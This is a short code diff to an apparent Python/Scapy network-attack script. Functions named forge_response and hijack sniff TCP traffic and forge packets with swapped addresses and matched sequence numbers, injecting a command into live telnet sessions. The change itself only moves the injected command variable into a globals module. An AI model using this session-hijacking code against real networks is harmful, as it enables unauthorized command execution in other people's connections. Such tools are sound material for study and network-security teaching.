@@ -44,7 +44,7 @@ def forge_response(p, proto):
         cmd_ip = IP(src=p[IP].dst, dst=p[IP].src)
         cmd_tcp = TCP(sport=p[TCP].dport, dport=p[TCP].sport, seq=p[TCP].ack, ack=p[TCP].seq + tcp_seg_len, flags="PA")
 
-        command = '\r\n' + CMD + '\r\n'
+        command = '\r\n' + globals.CMD + '\r\n'
         cmd = cmd_ether / cmd_ip / cmd_tcp / command
 
         response = cmd
@@ -65,7 +65,7 @@ def hijack(p):
             sendp(response, verbose=0, iface=globals.IFACE)
 
     elif globals.PROTO == 'telnet':
-        if CMD not in str(p[TCP].payload):
+        if globals.CMD not in str(p[TCP].payload):
             cmd = forge_response(p, 'telnet')
             print('Spoofed command: ', cmd[TCP].payload)
 
